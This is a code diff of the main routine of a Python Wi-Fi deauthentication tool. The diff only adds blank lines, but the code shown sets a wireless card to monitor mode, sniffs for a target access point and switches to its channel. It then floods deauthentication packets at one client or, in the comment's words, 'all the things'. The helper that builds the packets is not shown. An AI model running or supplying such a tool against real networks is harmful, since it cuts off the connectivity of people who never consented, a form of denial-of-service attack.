@@ -17,14 +17,20 @@ def main(arguments):
         my_interface = interface(arguments.interface)
     else:
         my_interface = interface(get_interfaces()[1])
+
     print_update(f"[+] The interface used for deauthentication is: {my_interface.name}")
+    
     # Put the interface into monitor mode
     my_interface.set_monitor_mode()
+
     print_update(f"[+] {my_interface.name} has been set into monitor mode")
+    
     # Gets the empty dataframe from the callback
     networks = getDF()
+    
     # While the AP mac address isn't present keep searching
     print_update(f"[+] Beginning search for {arguments.bssid}")
+    
     while(arguments.bssid not in networks.index):
         # Sniff 50 pcakets at a time
         sniff(prn=get_hostnames, iface=my_interface.name, count = 50)
@@ -37,8 +43,10 @@ def main(arguments):
     
     # Once the AP mac address is found get the channel
     channel_for_deauth = networks.loc[arguments.bssid, "Channel"]
+    
     # Set the antena channel to that of the AP in order to deauth
     my_interface.change_channel(channel_for_deauth)
+    
     # Check if a destination mac was provided
     # If it was only deauth that device
     # Else disconnect all the things
@@ -64,6 +72,7 @@ def main(arguments):
             print_update(f"[+] Sending 2000 Packets!!! Screw the WIFI connectivity to all the things!!!")
             deauth(my_interface.name, 
                     arguments.bssid)
+
 
 # Start of the program
 if __name__ == '__main__':
